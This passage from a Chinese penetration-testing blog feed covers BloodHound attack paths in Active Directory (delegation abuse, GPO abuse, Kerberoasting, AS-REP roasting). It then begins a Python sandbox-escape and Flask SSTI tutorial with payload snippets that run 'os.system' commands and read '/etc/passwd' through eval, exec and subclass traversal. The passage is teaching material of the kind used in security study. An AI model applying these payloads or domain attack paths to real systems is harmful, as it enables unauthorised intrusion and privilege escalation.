Delegation）</strong>，服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。</li></ul><p>举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了C用户的TGT，从而可以模拟用户C访问任意服务。</p><p><em>从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</em></p><ul><li><p><strong>二是约束性委派（Constrained Delegation）</strong>，即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</p></li><li><p><strong>三是协议传递，即Kerberos的扩展协议S4U2Self</strong>，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。</p></li></ul><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。如下图所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01f8cfe7e1c4fc013a.png" alt="img"></p><p><strong>GPO</strong>（<a href="https://technet.microsoft.com/en-us/windowsserver/bb310732.aspx">Group Policy Objects</a>）：</p><ul><li>组策略使管理员能够管理Active Directory中的计算机和用户。组策略保存为组策略对象（GPO）</li><li>攻击者可以滥用GPO，通过欺诈方式进一步自动化地传播恶意软件、实现持久化驻留目的</li><li>恶意软件可以利用GPO穿越IDS/IPS等防火墙，最终访问到域内所有的系统。</li><li>GPO的另一优点就是攻击过程期间并不需要目标系统在线，一旦离线状态下的目标系统重新登录到域中，恶意的GPO载荷就会被投递到目标系统。</li><li>组策略默认情况下每90分钟（域控制器5分钟）可包括安全选项，注册表项，软件安装以及启动和关闭脚本以及域成员刷新组策略设置。这意味着组策略在目标计算机上执行配置的设置。</li></ul></blockquote><p><strong>BloodHund 示例</strong></p><p>摘自<a href="https://xz.aliyun.com/t/7311#toc-0">利用BloodHound分析域中的攻击路径</a>，前辈分析的很清楚</p><p>点击一下即可看到路径</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200229170834-1046899c-5ad3-1.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229170834-1046899c-5ad3-1.png" alt="img"></a></p><p>因为这个域上的关系结构比较简单，所有看起来也不是很复杂，我们这里以域用户<code>qiyou</code>为例吧，可以把鼠标放在这个用户图标上，然后与它相关的路径都会变红，如下图</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200229170722-e5883aa2-5ad2-1.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229170722-e5883aa2-5ad2-1.png" alt="img"></a></p><p>有两个具有非约束委派的系统，一个是<code>win10</code>一个是<code>windows server 2008R2</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229171247-a7312a88-5ad3-1.png" alt="img"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229171610-1fc20eae-5ad4-1.png" alt="img"></p><p>首先看到第一条路径，用户<code>qiyou</code>是对<code>Default Domain Policy</code>具有委派权限的，权限为<code>GenericWrite</code>，也就是说用户qiyou对这个<strong>GPO</strong>具有修改权限的，那么我们就可以通过这个用户来修改域上默认组策略的一些设置，比如设置计划任务，<code>Default Domain Policy</code>这个GPO默认是链接到域本身的，也就说这个GPO的计划任务默认是对域控生效的，通过命令行来注册GPO计划任务可以参考三好学生师傅这个篇文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C(%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E4%B8%8E%E8%84%9A%E6%9C%AC%E7%BB%86%E8%8A%82)/">地址</a>，因为不是这里重点就不多赘述了</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229171123-74da2828-5ad3-1.png" alt="img"></p><p>回到域控验证用户qiyou对该GPO是否具有委派权限</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200228215936-8db7e778-5a32-1.png" alt="img"></p><p>第二条路径，如下图所示</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229171908-89ddca62-5ad4-1.png" alt="img"></p><p>路径的大概描述是：用户qiyou对test具有<code>GenericAll</code>权限（完全控制权限），而<code>test</code>对主机<code>DM2012.TEST.LOCAL</code>具有某个服务的约束委派权限，那么就有可能通过约束委派得到<code>DM2012.TEST.LOCAL</code>的权限，而用户administrator又在主机<code>DM2012.TEST.LOCAL</code>上有一个会话，那么就有可能从内存中dump出用户administrator的凭证，而用户<code>administrator</code>又属于<code>DOMAIN ADMINS</code>组，<code>DOMAIN ADMINS</code>组又对该非约束委派的主机具有完全控制权限，从而形成了整条利用链</p><p>用户qiyou对test具有完全控制权限，那么用户qiyou可以给用户test注册spn、修改密码等等</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200228234046-aff8367c-5a40-1.png" alt="img"></p><h2 id="6-Shortest-Path-from-Owned-Principals-从拥有的主体的最短路径"><a href="#6-Shortest-Path-from-Owned-Principals-从拥有的主体的最短路径" class="headerlink" title="6. Shortest Path from Owned Principals 从拥有的主体的最短路径"></a>6. Shortest Path from Owned Principals 从拥有的主体的最短路径</h2><p>当我们将已控制的结点标记为Owned后，我们就可以使用这个功能。</p><p>标记方法如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314223154687.png" alt="image-20210314223154687"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314223253211.png" alt="image-20210314223253211"></p><h2 id="7-Find-Computers-where-Domain-Users-can-read-LAPS-passwords-查找域用户可以读取LAPS密码的计算机"><a href="#7-Find-Computers-where-Domain-Users-can-read-LAPS-passwords-查找域用户可以读取LAPS密码的计算机" class="headerlink" title="7. Find Computers where Domain Users can read LAPS passwords 查找域用户可以读取LAPS密码的计算机"></a>7. Find Computers where Domain Users can read LAPS passwords 查找域用户可以读取LAPS密码的计算机</h2><p><strong>知识补充</strong></p><blockquote><p><strong>LAPS</strong>：</p><p>摘自：<a href="https://www.buaq.net/go-28036.html">渗透中的内网渗透</a></p><p>Local Administrator Password Solution是密码解决方案，为了防止一台机器被抓到密码后，然后网内都是同密码机器导致被横向渗透。</p><p>但是也存在相应的安全隐患，当我们拿下域控时，可以查看计算机本地密码;当权限配置不当时，也会导致其他用户有权限查看他人计算机本地密</p><p>如果安装LAPS，在安装的软件列表里能看到：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/img.php" alt="img"></p></blockquote><h2 id="8-Shortest-Paths-to-Domain-Admins-from-Kerberoastable-Users-Kerberoastable用户到域管理员的最短路径"><a href="#8-Shortest-Paths-to-Domain-Admins-from-Kerberoastable-Users-Kerberoastable用户到域管理员的最短路径" class="headerlink" title="8. Shortest Paths to Domain Admins from Kerberoastable Users Kerberoastable用户到域管理员的最短路径"></a>8. Shortest Paths to Domain Admins from Kerberoastable Users Kerberoastable用户到域管理员的最短路径</h2><p><strong>知识补充</strong></p><blockquote><p>**SPN (Service Principal Names)**：</p><p>摘自：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透——Kerberoasting</a></p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p><p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><ul><li><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p></li><li><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p></li></ul><p><strong>Kerberoasting</strong>：</p></blockquote><p><strong>具体示例</strong></p><p>这个就比较简单了，也不用多讲了上面也说过了用户test是<code>Kerberoastable</code>，域上的所有用户都是可以通过<code>Kerberoasting</code>得到<code>Kerberoastable</code>用户hash的</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229100223-86a8dbe4-5a97-1.png" alt="img"></p><p>注册的SPN可以在左侧<code>Node Info</code>看到，为<code>test/test.local</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229100728-3c7f01e6-5a98-1.png" alt="img"></p><p><code>Kerberoasting</code>可以得到用户hash，然后<code>hashcat</code>枚举口令即可</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200229102001-fd306c08-5a99-1.png" alt="img"></p><h2 id="9-Find-AS-REP-Roastable-Users-DontReqPreAuth-查找AS-REP-Roastable用户（DontReqPreAuth）"><a href="#9-Find-AS-REP-Roastable-Users-DontReqPreAuth-查找AS-REP-Roastable用户（DontReqPreAuth）" class="headerlink" title="9.  Find AS-REP Roastable Users (DontReqPreAuth) 查找AS-REP Roastable用户（DontReqPreAuth）"></a>9.  Find AS-REP Roastable Users (DontReqPreAuth) 查找AS-REP Roastable用户（DontReqPreAuth）</h2><p><strong>知识补充</strong></p><blockquote><p>AS-REP Roasting 是针对不需要预身份验证的用户帐户的Kerberos攻击。预身份验证是Kerberos身份验证的第一步，旨在防止暴力破解密码猜测攻击。</p><p>在预身份验证期间，用户将输入其密码，该密码将用于加密时间戳，然后域控制器将尝试对其进行解密，并验证是否使用了正确的密码，并且该密码不会重播先前的请求。从那里，将发出TGT，供用户用于将来的身份验证。如果禁用了预身份验证，则攻击者可以为任何用户请求身份验证数据，并且DC将返回加密的TGT，该TGT可以通过离线暴力破解。 </p><p>幸运的是，默认情况下，Active Directory中需要预身份验证。但是，可以通过每个用户帐户上的用户帐户控制设置来控制此设置，如下所示：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/ASREP-1.png" alt="AS-REP烘焙"></p></blockquote><h1 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h1><ul><li><a href="https://xz.aliyun.com/t/7311#toc-6">利用BloodHound分析域中的攻击路径</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/">域渗透——DCSync</a></li><li><a href="https://zhuanlan.zhihu.com/p/174748699">内网渗透入门–域相关概念</a></li><li><a href="https://rootrain.me/2020/02/29/bloodhound%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8">bloodhound技术分析</a></li><li><a href="https://www.anquanke.com/post/id/92484">利用域委派获取域管理权限</a></li><li><a href="https://zhuanlan.zhihu.com/p/52020167">我所了解的内网渗透——内网渗透知识大总结</a></li><li><a href="https://medium.com/@riccardo.ancarani94/bloodhound-tips-and-tricks-e1853c4b81ad">BloodHound Tips and Tricks</a></li><li><a href="https://www.buaq.net/go-28036.html">渗透中的内网渗透</a></li><li><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透——Kerberoasting</a></li><li><a href="https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/">CRACKING ACTIVE DIRECTORY PASSWORDS WITH AS-REP ROASTING</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
      <category>内网渗透</category>
      
      <category>BloodHound</category>
      
      <category>BloodHound</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
      <tag>BloodHound</tag>
      
      <tag>内网渗透</tag>
      
      <tag>DCSync</tag>
      
      <tag>GPO</tag>
      
      <tag>SPN</tag>
      
      <tag>AS-REP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python沙箱逃逸&amp;flask SSTI</title>
    <link href="/2020/10/05/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-flask-SSTI/"/>
    <url>/2020/10/05/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-flask-SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h1><p>要讲解python沙箱逃逸，首先就有必要来深入了解一下python的一些<strong>基础知识！</strong></p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="内键函数"><a href="#内键函数" class="headerlink" title="内键函数"></a>内键函数</h3><p>当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p><p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p><h3 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h3><p>名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间</p><ul><li>内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字</li><li>全局名称空间：在执行文件时，存放文件级别定义的名字</li><li>局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效</li></ul><p>加载顺序：内置名称空间*——&gt;全局名称空间—–&gt;局部名称空间* </p><p>名字的查找顺序：局部名称空间*——&gt;全局名称空间—–&gt;内置名称空间*</p><p>我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的<strong>builtins</strong>模块提供内建名称空间到内建对象的映射</p><p>dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929190721621.png" alt="image-20200929190721621"></p><p>这里面，我们可以看到<code>__builtins__</code>是做为默认初始模块出现的，那么用dir()命令看看<code>__builtins__</code>的成分。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200929190812485.png" alt="image-20200929190812485"></p><p>在这个里面，我们会看到很多熟悉的关键字。比如：<code>__import__</code>、<code>str</code>、<code>len</code>等。看到这里大家会不会突然想明白为什么python解释器里能够直接使用某些函数了？比如直接使用len()函数</p><p>再或者说，我们可以直接import导入模块，这些操作其实都是python解释器事先给我们加载进去了的。</p><p><strong>就是说python可以再未加载任何模块的时候就可以使用的方法，在内键空间中已经声明过</strong></p><h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><p>python中对一个变量应用<strong>class</strong>方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法</p><div class="hljs code-wrapper"><pre><code class="hljs python">__base__ //对象的一个基类，一般情况下是<span class="hljs-built_in">object</span>，有时不是，这时需要使用下一个方法__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，<span class="hljs-built_in">object</span>在最底层故在列表中的最后，通过__mro__[-<span class="hljs-number">1</span>]可以获取到__subclasses__() //继承此对象的子类，返回一个列表</code></pre></div><p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦。</p><h3 id="import导入机制"><a href="#import导入机制" class="headerlink" title="import导入机制"></a>import导入机制</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/9113969-e5945487b84c3721.png" alt="图片.png"></p><p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.py&#x27;</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>f.read()<span class="hljs-string">&#x27;import os&#x27;</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> test<span class="hljs-meta">&gt;&gt;&gt; </span>test.os.system(<span class="hljs-string">&#x27;dir&#x27;</span>)<span class="hljs-comment">###等价于</span><span class="hljs-meta">&gt;&gt;&gt; </span>test.__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;dir&#x27;</span>)</code></pre></div><h3 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h3><div class="hljs code-wrapper"><pre><code class="hljs python">__dict__：保存类实例或对象实例的属性变量键值对字典__class__：返回调用的参数类型__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__bases__：返回类型列表__subclasses__：返回<span class="hljs-built_in">object</span>的子类__init__：类的初始化方法__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价__base__ 和 __mro__ 都是用来寻找基类的。__getattribute__：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用.__enter__：上下文管理器，为<span class="hljs-keyword">with</span>而生__func__</code></pre></div><h3 id="常见函数、属性、模块"><a href="#常见函数、属性、模块" class="headerlink" title="常见函数、属性、模块"></a>常见函数、属性、模块</h3><h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><p>根据上面提到的类继承的知识，我们可以总结出一个利用方式（这也是python沙盒溢出的关键）：<strong>从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</strong> 这个流程中，找到我们想要的模块或者函数。</p><h3 id="获取当前python环境"><a href="#获取当前python环境" class="headerlink" title="获取当前python环境"></a>获取当前python环境</h3><h5 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h5><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> syssys.version</code></pre></div><h3 id="查看当前可以使用的函数"><a href="#查看当前可以使用的函数" class="headerlink" title="查看当前可以使用的函数"></a>查看当前可以使用的函数</h3><p>列出<code>__buildins__</code></p><p><code>dir(__buildins__)</code></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">dir</span>(__builtins__)[<span class="hljs-string">&#x27;ArithmeticError&#x27;</span>, <span class="hljs-string">&#x27;AssertionError&#x27;</span>, <span class="hljs-string">&#x27;AttributeError&#x27;</span>, <span class="hljs-string">&#x27;BaseException&#x27;</span>, <span class="hljs-string">&#x27;BlockingIOError&#x27;</span>, <span class="hljs-string">&#x27;BrokenPipeError&#x27;</span>, <span class="hljs-string">&#x27;BufferError&#x27;</span>, <span class="hljs-string">&#x27;BytesWarning&#x27;</span>, <span class="hljs-string">&#x27;ChildProcessError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="hljs-string">&#x27;ConnectionResetError&#x27;</span>, <span class="hljs-string">&#x27;DeprecationWarning&#x27;</span>, <span class="hljs-string">&#x27;EOFError&#x27;</span>, <span class="hljs-string">&#x27;Ellipsis&#x27;</span>, <span class="hljs-string">&#x27;EnvironmentError&#x27;</span>, <span class="hljs-string">&#x27;Exception&#x27;</span>, <span class="hljs-string">&#x27;False&#x27;</span>, <span class="hljs-string">&#x27;FileExistsError&#x27;</span>, <span class="hljs-string">&#x27;FileNotFoundError&#x27;</span>, <span class="hljs-string">&#x27;FloatingPointError&#x27;</span>, <span class="hljs-string">&#x27;FutureWarning&#x27;</span>, <span class="hljs-string">&#x27;GeneratorExit&#x27;</span>, <span class="hljs-string">&#x27;IOError&#x27;</span>, <span class="hljs-string">&#x27;ImportError&#x27;</span>, <span class="hljs-string">&#x27;ImportWarning&#x27;</span>, <span class="hljs-string">&#x27;IndentationError&#x27;</span>, <span class="hljs-string">&#x27;IndexError&#x27;</span>, <span class="hljs-string">&#x27;InterruptedError&#x27;</span>, <span class="hljs-string">&#x27;IsADirectoryError&#x27;</span>, <span class="hljs-string">&#x27;KeyError&#x27;</span>, <span class="hljs-string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="hljs-string">&#x27;LookupError&#x27;</span>, <span class="hljs-string">&#x27;MemoryError&#x27;</span>, <span class="hljs-string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="hljs-string">&#x27;NameError&#x27;</span>, <span class="hljs-string">&#x27;None&#x27;</span>, <span class="hljs-string">&#x27;NotADirectoryError&#x27;</span>, <span class="hljs-string">&#x27;NotImplemented&#x27;</span>, <span class="hljs-string">&#x27;NotImplementedError&#x27;</span>, <span class="hljs-string">&#x27;OSError&#x27;</span>, <span class="hljs-string">&#x27;OverflowError&#x27;</span>, <span class="hljs-string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="hljs-string">&#x27;PermissionError&#x27;</span>, <span class="hljs-string">&#x27;ProcessLookupError&#x27;</span>, <span class="hljs-string">&#x27;RecursionError&#x27;</span>, <span class="hljs-string">&#x27;ReferenceError&#x27;</span>, <span class="hljs-string">&#x27;ResourceWarning&#x27;</span>, <span class="hljs-string">&#x27;RuntimeError&#x27;</span>, <span class="hljs-string">&#x27;RuntimeWarning&#x27;</span>, <span class="hljs-string">&#x27;StopAsyncIteration&#x27;</span>, <span class="hljs-string">&#x27;StopIteration&#x27;</span>, <span class="hljs-string">&#x27;SyntaxError&#x27;</span>, <span class="hljs-string">&#x27;SyntaxWarning&#x27;</span>, <span class="hljs-string">&#x27;SystemError&#x27;</span>, <span class="hljs-string">&#x27;SystemExit&#x27;</span>, <span class="hljs-string">&#x27;TabError&#x27;</span>, <span class="hljs-string">&#x27;TimeoutError&#x27;</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;TypeError&#x27;</span>, <span class="hljs-string">&#x27;UnboundLocalError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="hljs-string">&#x27;UnicodeWarning&#x27;</span>, <span class="hljs-string">&#x27;UserWarning&#x27;</span>, <span class="hljs-string">&#x27;ValueError&#x27;</span>, <span class="hljs-string">&#x27;Warning&#x27;</span>, <span class="hljs-string">&#x27;WindowsError&#x27;</span>, <span class="hljs-string">&#x27;ZeroDivisionError&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;__build_class__&#x27;</span>, <span class="hljs-string">&#x27;__debug__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__spec__&#x27;</span>, <span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;all&#x27;</span>, <span class="hljs-string">&#x27;any&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;bin&#x27;</span>, <span class="hljs-string">&#x27;bool&#x27;</span>, <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;bytearray&#x27;</span>, <span class="hljs-string">&#x27;bytes&#x27;</span>, <span class="hljs-string">&#x27;callable&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;classmethod&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;complex&#x27;</span>, <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span>, <span class="hljs-string">&#x27;delattr&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;divmod&#x27;</span>, <span class="hljs-string">&#x27;enumerate&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;filter&#x27;</span>, <span class="hljs-string">&#x27;float&#x27;</span>, <span class="hljs-string">&#x27;format&#x27;</span>, <span class="hljs-string">&#x27;frozenset&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>, <span class="hljs-string">&#x27;hasattr&#x27;</span>, <span class="hljs-string">&#x27;hash&#x27;</span>, <span class="hljs-string">&#x27;help&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;isinstance&#x27;</span>, <span class="hljs-string">&#x27;issubclass&#x27;</span>, <span class="hljs-string">&#x27;iter&#x27;</span>, <span class="hljs-string">&#x27;len&#x27;</span>, <span class="hljs-string">&#x27;license&#x27;</span>, <span class="hljs-string">&#x27;list&#x27;</span>, <span class="hljs-string">&#x27;locals&#x27;</span>, <span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;next&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;oct&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;ord&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;property&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>, <span class="hljs-string">&#x27;range&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;reversed&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;set&#x27;</span>, <span class="hljs-string">&#x27;setattr&#x27;</span>, <span class="hljs-string">&#x27;slice&#x27;</span>, <span class="hljs-string">&#x27;sorted&#x27;</span>, <span class="hljs-string">&#x27;staticmethod&#x27;</span>, <span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;sum&#x27;</span>, <span class="hljs-string">&#x27;super&#x27;</span>, <span class="hljs-string">&#x27;tuple&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>, <span class="hljs-string">&#x27;vars&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>]</code></pre></div><p>常用的函数：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>: <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<span class="hljs-built_in">input</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-built_in">open</span>,file: file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()<span class="hljs-built_in">exec</span> : exec(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>);execfile: 加载文件进内，相当于<span class="hljs-keyword">from</span> xx <span class="hljs-keyword">import</span> *execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)  system(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-built_in">map</span>　回调函数<span class="hljs-built_in">map</span>(os.system,[<span class="hljs-string">&#x27;ls&#x27;</span>])</code></pre></div><h3 id="object寻找"><a href="#object寻找" class="headerlink" title="object寻找"></a>object寻找</h3><blockquote><p>其主要思想是使用_<em>class__、__mro__、__bases_</em></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>][].__class__.__mro__[<span class="hljs-number">1</span>]&#123;&#125;.__class__.__mro__[<span class="hljs-number">1</span>]().__class__.__mro__[<span class="hljs-number">1</span>][].__class__.__mro__[-<span class="hljs-number">1</span>]&#123;&#125;.__class__.__mro__[-<span class="hljs-number">1</span>]().__class__.__mro__[-<span class="hljs-number">1</span>]&#123;&#125;.__class__.__bases__[<span class="hljs-number">0</span>]().__class__.__bases__[<span class="hljs-number">0</span>][].__class__.__bases__[<span class="hljs-number">0</span>][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__request.__class__.__mro__[<span class="hljs-number">8</span>] //针对jinjia2/flask为[<span class="hljs-number">9</span>]适用</code></pre></div><h3 id="子类遍历"><a href="#子类遍历" class="headerlink" title="子类遍历"></a><strong>子类遍历</strong></h3><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> 